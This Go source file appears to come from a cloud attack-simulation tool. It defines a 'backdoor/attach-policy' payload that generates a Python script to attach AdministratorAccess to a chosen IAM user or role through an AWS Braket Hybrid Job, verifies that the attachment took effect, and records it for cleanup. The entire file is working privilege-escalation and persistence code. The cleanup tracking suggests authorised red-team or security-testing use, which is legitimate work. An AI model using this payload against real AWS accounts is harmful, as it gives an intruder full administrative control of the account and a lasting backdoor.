// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package braket

import (
	"context"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload generates a Python script that attaches
// AdministratorAccess (or a custom policy) to a specified IAM user or role when
// run inside a Braket Hybrid Job container. Parameters are read from environment
// variables, which Braket populates from the job's HyperParameters map.
type BackdoorAttachPolicyPayload struct{}

func init() {
	_ = payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess policy to an existing IAM user or role via Braket Hybrid Job"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceBraket,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user or role name/ARN to attach the policy to (auto-resolved from caller identity if unset)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "Policy ARN to attach (defaults to AdministratorAccess)",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
	}
	return nil
}

// GenerateCode produces a standalone Python script for Braket Hybrid Job execution.
// Parameters are passed as Braket HyperParameters and read from os.environ inside
// the container. The script auto-detects whether TARGET_ARN refers to a user or role
// and calls the appropriate IAM attach API at runtime.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetARN := options["TARGET_ARN"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	code := fmt.Sprintf(`import boto3
import os

# Parameters are injected by Braket as environment variables from HyperParameters.
# Defaults fall back to the values baked in at code-generation time.
target_arn = os.environ.get("TARGET_ARN", %q)
policy_arn = os.environ.get("POLICY_ARN", %q)


def attach_policy(target_arn, policy_arn):
    """Attach policy to an IAM user or role, detected from the ARN."""
    iam = boto3.client("iam")
    if ":role/" in target_arn or ":assumed-role/" in target_arn:
        # Extract role name from ARN: arn:aws:iam::ACCOUNT:role/NAME
        # or arn:aws:sts::ACCOUNT:assumed-role/NAME/SESSION
        parts = target_arn.split("/")
        role_name = parts[-2] if ":assumed-role/" in target_arn else parts[-1]
        iam.attach_role_policy(RoleName=role_name, PolicyArn=policy_arn)
        print(f"Successfully attached {policy_arn} to role {role_name}")
    else:
        # User ARN (arn:aws:iam::ACCOUNT:user/NAME) or plain username
        user_name = target_arn.split("/")[-1] if "/" in target_arn else target_arn
        iam.attach_user_policy(UserName=user_name, PolicyArn=policy_arn)
        print(f"Successfully attached {policy_arn} to user {user_name}")


def main():
    try:
        attach_policy(target_arn, policy_arn)
    except Exception as e:
        print(f"Error attaching policy: {e}")
        raise


if __name__ == "__main__":
    main()
`, targetARN, policyArn)

	return code, nil
}

// ProcessResult passes through the module's result string. Braket jobs do not return
// output to the caller; the module verifies the effect by checking IAM state.
func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}

// VerifySuccess checks whether the target principal has the expected policy attached.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	targetARN := options["TARGET_ARN"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	if targetARN == "" {
		return false, fmt.Errorf("TARGET_ARN not set; cannot verify")
	}

	principalName, principalType := payloads.PrincipalFromARN(targetARN)
	iamClient := iam.NewFromConfig(config)

	switch principalType {
	case "role":
		result, err := iamClient.ListAttachedRolePolicies(ctx, &iam.ListAttachedRolePoliciesInput{
			RoleName: aws.String(principalName),
		})
		if err != nil {
			return false, nil
		}
		for _, policy := range result.AttachedPolicies {
			if aws.ToString(policy.PolicyArn) == policyArn {
				return true, nil
			}
		}
	default:
		result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
			UserName: aws.String(principalName),
		})
		if err != nil {
			return false, nil
		}
		for _, policy := range result.AttachedPolicies {
			if aws.ToString(policy.PolicyArn) == policyArn {
				return true, nil
			}
		}
	}
	return false, nil
}

// ReportSideEffects returns the policy attachment as a tracked modification so the
// workspace cleanup system can reverse it.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	targetARN := options["TARGET_ARN"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	policyName := "AdministratorAccess"
	if idx := strings.LastIndex(policyArn, "/"); idx != -1 {
		policyName = policyArn[idx+1:]
	}

	principalName, principalType := payloads.PrincipalFromARN(targetARN)
	cleanupMethod := "iam:DetachUserPolicy"
	if principalType == "role" {
		cleanupMethod = "iam:DetachRolePolicy"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", principalName, policyName),
			ARN:           policyArn,
			CleanupMethod: cleanupMethod,
			Metadata: map[string]string{
				"principal_type": principalType,
				"principal_name": principalName,
				"policy_arn":     policyArn,
			},
		},
	}
}

